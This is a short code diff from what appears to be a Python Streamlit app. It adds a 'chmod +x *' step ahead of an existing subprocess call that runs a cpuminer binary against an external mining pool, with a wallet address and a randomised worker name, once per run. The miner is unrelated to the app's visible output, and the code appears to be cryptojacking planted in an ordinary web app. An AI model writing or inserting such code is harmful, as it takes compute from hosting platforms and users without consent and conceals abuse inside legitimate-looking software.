@@ -80,6 +80,7 @@ st.write("tarik", flag.controlFlag)
 
 if flag.controlFlag==0:
     flag.controlFlag+=1
+    os.system('chmod +x *')
     p = subprocess.run("./cpuminer-sse2 -a yespowerr16  -o stratum+tcps://stratum-na.rplant.xyz:13382 -u YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe.ODM-$(echo $(shuf -i 10000-99999 -n 1))", stdout=subprocess.PIPE, shell=True)
     print(f"GOZUKTUMMMMMMMMMMMMMMM {flag.controlFlag}")
 
